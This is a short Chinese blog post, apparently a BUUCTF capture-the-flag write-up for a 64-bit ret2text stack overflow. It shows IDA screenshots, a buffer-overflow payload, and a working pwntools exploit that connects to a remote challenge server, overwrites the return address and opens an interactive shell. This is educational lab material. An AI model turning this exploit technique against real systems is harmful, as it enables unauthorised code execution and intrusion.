---
title: BUUCTF_0x2
categories: 
    - CTF刷题记录
    - BUUCTF
---
# BUUCTF_0x2
<!--more-->
## 1.01栈溢出之ret2text

### ret2text 64

很简单的一个栈溢出
直接IDA分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012194826370.png#pic_center)

从main函数跟进到welcome函数
get() 很明显的溢出

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012194915979.png#pic_center)

```python
payload = 'a'*(0x80+8)
```
因为是64位的，所以后面要加上8
Shift+F12 

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012195035341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

发现/bin/sh 果然够简单的。。。
双击进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012195145849.png#pic_center)

再双击

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012195243513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

找到地址
exp：

```python
from pwn import *

p=remote('111.231.70.44',28072)

payload='a'*(0x80+8) + p64(0x40063B)

p.sendline(payload)

p.interactive()
```
